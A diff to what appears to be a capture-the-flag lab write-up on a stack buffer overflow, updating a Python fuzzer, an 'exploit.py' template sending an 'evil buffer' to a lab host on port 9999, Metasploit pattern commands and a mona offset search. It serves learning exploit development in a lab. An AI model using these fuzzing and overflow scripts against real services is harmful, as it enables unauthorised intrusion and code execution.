@@ -6,6 +6,7 @@
 
 * Nmap
 * FTP
+* Phyton
 
 ## Task 1 - Deploy Machine and Scan Network
 
@@ -111,74 +112,85 @@ If you've not done buffer overflows before, check [this](https://tryhackme.com/r
 	* Fuzzing the application with `fuzzer.py`
 	
 		```
-		#!/usr/bin/env python3
+		#!/usr/share/python
 
 		import socket, time, sys
 
-		ip = "MACHINE_IP"
-		port = 9999
+		ip = '10.37.1.149'		# Change to IP Host
+		port = 9999				# Change to Port Host
 		timeout = 5
-		
+
 		string = "A" * 100
 
-		while True:
-		  try:
-		    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-		      s.settimeout(timeout)
-		      s.connect((ip, port))
-		      s.recv(1024)
-		      print("Fuzzing with {} bytes".format(len(string)))
-		      s.send(bytes(string, "latin-1"))
-		      s.recv(1024)
-		  except:
-		    print("Fuzzing crashed at {} bytes".format(len(string)))
-		    sys.exit(0)
-		  string += 100 * "A"
-		  time.sleep(1)
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			s.settimeout(timeout)
+			s.connect((ip, port))
+			s.recv(1024)
+			s.recv(1024)
+			s.send(b"KakakSeram \r\n")
+			s.recv(1024)
+			print("#### Starting Fuzzing #####")
+			while True:
+				print("[+] Sending " + str(len(string)) + " bytes...")
+				s.send(bytes(string, "latin-1"))
+				s.recv(1024)
+				string += "A" * 100
+				time.sleep(1)
+		except:
+			print("#### End of Fuzzing #####")
+			print("Fuzzing crashed at " + str(len(string)) + " bytes")
+			sys.exit(0)
+			s.close()
 		```
 
-		![task3-fuzzer1](./images/task3-fuzzer1.png)
+		![task3-fuzzer](./images/task3-fuzzer.png)
 
-		![task3-fuzzer2](./images/task3-fuzzer2.png)
-
-		We got program crashed at 5900 bytes
+		We got program crashed at 2800 bytes
 
 		![task3-debug2](./images/task3-debug2.png)
+
+		EIP value 41414141, it means our string "A" overflow to the program
 
 	* Create file `exploit.py`
 	
 		```
+		#!/usr/share/python
+
 		import socket
 
-		ip = "MACHINE_IP"
-		port = 9999
+		ip = '10.37.1.149'		# Change to IP Host
+		port = 9999			# Change to Port Host
 
 		offset = 0
 		overflow = "A" * offset
 		retn = ""
 		padding = ""
 		payload = ""
-		postfix = ""
 
-		buffer = overflow + retn + padding + payload + postfix
+		buffer = overflow + retn + padding + payload
 
 		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
 		try:
-		  s.connect((ip, port))
-		  print("Sending evil buffer...")
-		  s.send(bytes(buffer + "\r\n", "latin-1"))
-		  print("Done!")
+			s.connect((ip, port))
+			s.recv(1024)
+			s.recv(1024)
+			s.send(b"KakakSeram \r\n")
+			s.recv(1024)
+			print("Sending evil buffer...")
+			s.send(bytes(buffer + "\r\n", "latin-1"))
+			print("Done!")
 		except:
-		  print("Could not connect.")
+			print("Could not connect.")
   		```
 
   		![task3-exploit1](./images/task3-exploit1.png)
 
-	* Create pattern with adding 400 bytes from crached program (5900 + 400 = 6300)
+	* Create pattern with adding 400 bytes from crached program (2800 + 400 = 3200)
 	
 		```
-		/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 6300
+		/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3200
 		```
 
 		![task3-pattern](./images/task3-pattern.png)
@@ -200,14 +212,14 @@ If you've not done buffer overflows before, check [this](https://tryhackme.com/r
 	* In the command input box at the bottom of the screen **Immunity Debugger**, run the following mona command, changing the distance to the same length as the pattern
 	
 		```
-		!mona findmsp -distace 6300
+		!mona findmsp -distace 3200
 		```
 
 		![task3-offset](./images/task3-offset.png)
 
 		Finaly we got the offset
 
-	**EIP offset value = 6108**
+	**EIP offset value = 2012**
 
 * Now you know that you can overflow a buffer and potentially control execution, you need to find a function where ASLR/DEP is not enabled. Why not check the DLL file.
 
